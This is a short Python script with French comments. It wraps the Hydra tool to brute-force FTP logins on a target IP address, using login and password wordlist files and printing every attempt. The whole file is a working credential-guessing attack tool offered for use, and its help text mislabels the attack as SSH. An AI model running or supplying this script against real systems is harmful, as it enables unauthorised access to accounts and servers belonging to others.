import argparse
import subprocess

def run_hydra(target, login_file, password_file):
    print(f"\n🔍 Lancement de l'attaque FTP sur {target}...\n")

    # Construction de la commande
    command = [
        "hydra",
        "-L", login_file,
        "-P", password_file,
        "-t", "1",              # Une tâche à la fois pour voir chaque tentative
        "-V",                   # Mode verbeux → affiche chaque tentative
        target,
        "ftp"
    ]

    try:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

        for line in process.stdout:
            line = line.strip()
            print(line)

        process.wait()
        if process.returncode != 0:
            print(f"\n⚠️ Hydra s'est terminé avec un code de sortie : {process.returncode}")

    except FileNotFoundError:
        print("❌ Hydra n'est pas installé. Installe-le avec : sudo apt install hydra")
    except Exception as e:
        print(f"❌ Erreur inattendue : {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Brute-force SSH avec Hydra depuis Python")
    parser.add_argument("-c", "--cible", required=True, help="Adresse IP de la cible")
    parser.add_argument("-l", "--logins", required=True, help="Fichier des logins")
    parser.add_argument("-p", "--passwords", required=True, help="Fichier des mots de passe")

    args = parser.parse_args()

    run_hydra(args.cible, args.logins, args.passwords)

